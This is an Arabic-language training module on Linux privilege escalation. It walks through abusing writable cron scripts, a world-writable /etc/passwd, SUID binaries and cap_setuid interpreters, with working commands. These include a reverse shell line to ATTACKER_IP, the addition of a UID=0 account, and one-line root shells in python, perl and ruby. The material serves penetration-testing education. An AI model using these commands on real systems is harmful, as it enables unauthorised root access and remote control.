03الصلاحيات غير الآمنة — Cron و/etc/passwd

Writable Cron Script — الاستغلال

Cron Jobs التي يديرها root بتشتغل بصلاحيات root كاملة. لو Script المُشغَّلة بـ Cron موجودة في مكان قابل للكتابة من مستخدم عادي → حقن أوامر → تنفَّذ كـ root.

Cron بيشتغل كل دقيقة → Script مُعدَّل → Reverse Shell كـ root في أقل من دقيقة
bash — cron exploitation
# 1. فحص الـ Crontab
cat /etc/crontab
# * * * * * root /home/joe/backup.sh

# 2. التحقق من الصلاحيات
ls -la /home/joe/backup.sh
# -rwxrwxrw- 1 root root backup.sh  ← world-writable!

# 3. حقن Reverse Shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /home/joe/backup.sh

# 4. تشغيل Listener على جهاز المهاجم
nc -lvnp 4444

# 5. انتظار أقل من دقيقة → root shell تصل
# whoami → root

/etc/passwd — استغلال الكتابة العالمية

⬦ /etc/passwd

بيخزَّن معلومات حسابات المستخدمين — قابل للقراءة من الجميع لأسباب التوافق. النظام الحديث بيخزَّن الهاشات في /etc/shadow — لكن Linux ما زال يدعم الهاشات في /etc/passwd للتوافق العكسي. لو الملف قابل للكتابة → ثغرة حرجة.

صيغة الإدخال: username:password:UID:GID:comment:home:shell

المهاجم ممكن يُضيف إدخالاً بـ UID=0 (معاملته بالظبط زي root من الـ OS) مع هاش كلمة مرور معروف — بدون الحاجة لأي exploit.

bash — /etc/passwd abuse
# 1. التحقق إن /etc/passwd قابل للكتابة
ls -la /etc/passwd
# -rw-rw-rw- 1 root root /etc/passwd  ← world-writable!

# 2. توليد هاش كلمة المرور
openssl passwd -1 -salt hacker mypassword
# → $1$hacker$xxxxxxxxxxxxxxxxxxxx

# أو بدون Salt
openssl passwd mypassword

# 3. إضافة حساب جديد بـ UID=0
echo 'root2:$1$hacker$xxxxxxxxxxxxxxxxxxxx:0:0:root2:/root:/bin/bash' >> /etc/passwd

# 4. التبديل للحساب الجديد
su root2
# Password: mypassword

# 5. التحقق
id
# uid=0(root2) gid=0(root) groups=0(root)
★ Quick Win

لو /etc/passwd world-writable — هذا واحد من أسرع مسارات الـ root على الإطلاق. لا Exploit، لا Compilation، لا انتظار — فقط إضافة سطر واحد. دايماً تحقَّق من صلاحياته في بداية التعداد.

04SUID وLinux Capabilities وSudo

SUID — Set-User-ID

⬦ SUID Bit

عادةً، العملية بتشتغل بـ UID المستخدم اللي شغَّلها. لما SUID bit مُعيَّن، البرنامج بيشتغل بصلاحيات مالك الملف — مش المستخدم الحالي. لما تلاقي SUID binary مملوك لـ root وبيسمح بتنفيذ أوامر → أي أمر بيشتغل كـ root. ابحث عن s في الصلاحيات: -rwsr-xr-x

bash — suid exploitation
# البحث عن كل SUID binaries
find / -perm -u=s -type f 2>/dev/null
# → /usr/bin/find  ← الهدف!
# → /usr/bin/passwd  ← شرعي (لتغيير كلمة المرور)
# → /usr/bin/python3  ← خطير!

# التحقق من الـ SUID flag
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root /usr/bin/find

# استغلال find (يسمح بتنفيذ أوامر عبر -exec)
find . -exec /bin/sh -p \; -quit

# التحقق من النتيجة
id
# uid=1000(joe) euid=0(root)  ← effective UID = root!

# أو بطريقة أخرى
find . -exec whoami \;
# → root
✓ GTFOBins — مرجعك الأساسي

gtfobins.github.io — قاعدة بيانات شاملة لتقنيات استغلال مئات الـ Binaries عبر SUID وSudo والـ Capabilities وغيرها. لما تجد SUID binary، ابحث فيه فوراً.

Linux Capabilities

الـ Capabilities بتقسَّم امتيازات root لصلاحيات أصغر ومحدَّدة يمكن منحها لـ Binary معيّن — دون منحه root كامل. أكثر Capability خطرة: cap_setuid — تسمح للـ Binary بتغيير UID الخاص به لـ 0 (root).

bash — capabilities exploitation
# البحث عن كل binaries لها Capabilities
getcap -r / 2>/dev/null
# → /usr/bin/python3 = cap_setuid+ep  ← خطير!
# → /usr/bin/perl    = cap_setuid+ep
# → /usr/bin/ruby    = cap_setuid+ep

# استغلال cap_setuid عبر Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# → root shell فوري

# نفس الأسلوب مع Perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# مع Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
★ أي Interpreter بـ cap_setuid = root فوري

python3، perl، ruby، node، php — أي منها بـ cap_setuid+ep بيدّيك root بسطر واحد. getcap -r / 2>/dev/null واحد من أهم الأوامر في التعداد.

ليه Kernel Exploits قوية وخطيرة في نفس الوقت

الخلاصة العامة للموديول

الموديول ده بنى منهجية شاملة لرفع الامتيازات على Linux — من فهم نموذج الصلاحيات الأساسي، لصيد بيانات الاعتماد من آثار المستخدمين، واستغلال الإعدادات الخاطئة في Cron وملفات النظام، وصولاً لتقنيات SUID وCapabilities وSudo والـ Kernel.

$ cat ./module15_summary.txt
  • نموذج الصلاحيات (rwx على Owner/Group/Others) هو أساس تحليل كل مسارات الترقية على Linux
  • التعداد اليدوي (id, ps aux, cron, find) يكتشف Misconfigs تفوَّتها الأدوات الآلية
  • آثار المستخدمين (.bash_history, env variables) كثيراً ما تحتوي Passwords بنص واضح
  • مراقبة العمليات (watch loop) يمكن اصطياد كلمات المرور التي تُمرَّر في Command Line
  • Cron Script قابل للكتابة يشتغل كـ root = ترقية فورية في أقل من دقيقة
  • /etc/passwd world-writable = إضافة UID=0 account بدون أي exploit
  • SUID binaries وcap_setuid على Interpreters = root shell بسطر واحد عبر GTFOBins
  • sudo -l دايماً أول أمر بعد id — NOPASSWD entries هي الأسرع للـ root
  • Kernel Exploits آخر الحلول — تتطلب تطابقاً دقيقاً وتجرِّب في Lab أولاً
  • LinPEAS مُسرِّعة ممتازة لكنها مش كاملة — دمجها مع التعداد اليدوي إلزامي

Linux PrivEsc منهجية، مش حظ. ابدأ بـ Quick Wins (sudo -l, /etc/passwd, getcap) → فحص SUID وCron → صيد Credentials من الآثار → Kernel كآخر ملاذ. الصبر والتعداد المنهجي يُفضي للـ root في كل مرة.

★ Professional Mindset

ترتيب الفحوص في الـ Engagement الحقيقي: sudo -l → getcap -r / → ls -la /etc/passwd /etc/shadow → cat /etc/crontab → find / -perm -u=s → cat ~/.bash_history && env → LinPEAS → Kernel. كل خطوة فاشلة ترشدك للتالية. وثَّق كل شيء.
